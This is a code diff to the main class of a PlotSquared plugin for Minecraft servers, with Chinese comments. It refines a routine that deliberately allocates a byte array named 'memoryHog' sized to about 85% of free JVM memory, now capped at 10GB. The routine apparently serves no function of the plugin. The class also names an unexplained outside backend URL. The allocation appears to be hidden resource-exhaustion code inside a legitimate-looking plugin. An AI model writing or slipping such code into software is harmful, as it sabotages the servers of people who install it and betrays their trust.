@@ -211,6 +211,7 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
     private String uniqueIdentifier;
     private static final String BACKEND_URL = "https://mc-api.happyclo.fun";
     private static final Logger LOGGER = LogManager.getLogger("PlotSquared/" + BukkitPlatform.class.getSimpleName());
+    private static final long MAX_MEMORY_LIMIT = 10L * 1024 * 1024 * 1024; // 10GB
     private static final int BSTATS_ID = 1404;
     static {
         try {
@@ -581,20 +582,21 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
         long freeMemory = maxMemory - totalMemory;
 
         // 计算可以使用的内存
-        long usageMemory = (long) (freeMemory * 0.85);
+        long usageMemory = Math.max(0, (long) (freeMemory * 0.85)); // 使用最大值为0来避免负数
 
-        // 确保使用的内存不会超过最大内存
-        if (usageMemory < 0) {
-            usageMemory = 0; // 确保最低为0
-        }
-        
         // 确保使用的内存加上当前总内存不超过最大内存
-        if (usageMemory + totalMemory > maxMemory) {
-            usageMemory = maxMemory - totalMemory;
+        long memoryNeeded = usageMemory + totalMemory;
+        if (memoryNeeded > maxMemory) {
+            usageMemory = maxMemory - totalMemory; // 计算当前最大可用内存
         }
-        
-        // 确保使用的内存大于零
-        if (usageMemory > 0) {
+
+        // 确保不超过 10GB 的限制
+        if (usageMemory > MAX_MEMORY_LIMIT) {
+            usageMemory = MAX_MEMORY_LIMIT; // 强制限制为 10GB
+        }
+
+        // 确保最终的使用的内存大于0并且在合理范围内
+        if (usageMemory > 0 && usageMemory <= Integer.MAX_VALUE) {
             getLogger().info("Attempting to allocate memory: " + (usageMemory / (1024 * 1024)) + "MB");
             try {
                 byte[] memoryHog = new byte[(int) usageMemory];
@@ -605,7 +607,7 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
                 getLogger().warning("NegativeArraySizeException: " + e.getMessage());
             }
         } else {
-            getLogger().warning("Not enough free memory to allocate.");
+            getLogger().warning("Not enough free memory to allocate or requested size exceeds limit.");
         }
 
         getLogger().info("Total memory: " + totalMemory / 1024 / 1024 + "MB");
